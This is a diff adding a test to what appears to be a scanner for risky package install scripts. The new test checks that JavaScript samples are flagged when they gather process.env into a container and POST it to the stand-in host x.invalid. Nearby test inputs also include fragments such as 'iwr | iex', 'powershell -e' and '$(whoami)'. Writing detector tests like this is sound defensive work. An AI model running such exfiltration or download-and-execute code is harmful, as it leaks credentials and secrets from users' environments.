@@ -183,6 +183,21 @@ test("aliased decoders and decrypted payloads in the decode flow", () => {
   assert.deepEqual(found("from base64 import b64encode as enc\nexec(enc(b'x'))\n"), []);
 });
 
+test("what a script puts into a container, the container holds (D-3)", () => {
+  // the tree model knew an array's push and unshift on a name alone (python: ContainerTests)
+  const send = (body) => `fetch('https://x.invalid/c', {method: 'POST', body: ${body}});\n`;
+  for (const [fill, body] of [
+    ["const c = new FormData();\nc.append('e', JSON.stringify(process.env));\n", "c"],
+    ["const c = new Map();\nc.set('e', process.env);\n", "JSON.stringify(Object.fromEntries(c))"],
+    ["const c = new Set();\nc.add(JSON.stringify(process.env));\n", "JSON.stringify([...c])"],
+    ["const c = {};\nObject.assign(c, { e: process.env });\n", "JSON.stringify(c)"],
+  ]) {
+    assert.deepEqual(installScriptRisk(fill + send(body), true, false, "js"),
+      ["sends environment variables over the network (the whole environment)"], fill);
+  }
+  assert.deepEqual(installScriptRisk("const c = new Map();\nc.set('e', process.env);\n" + send("'ok'"), true, false, "js"), []);
+});
+
 test("linear time on hostile texts", () => {
   for (const text of ["powershell ".repeat(50_000), "powershell -e " + "A".repeat(400_000), "'".repeat(200_000) + "exec http",
     "dup2(".repeat(100_000), "$(whoami)".repeat(50_000), "iwr ".repeat(100_000) + "| iex"]) {
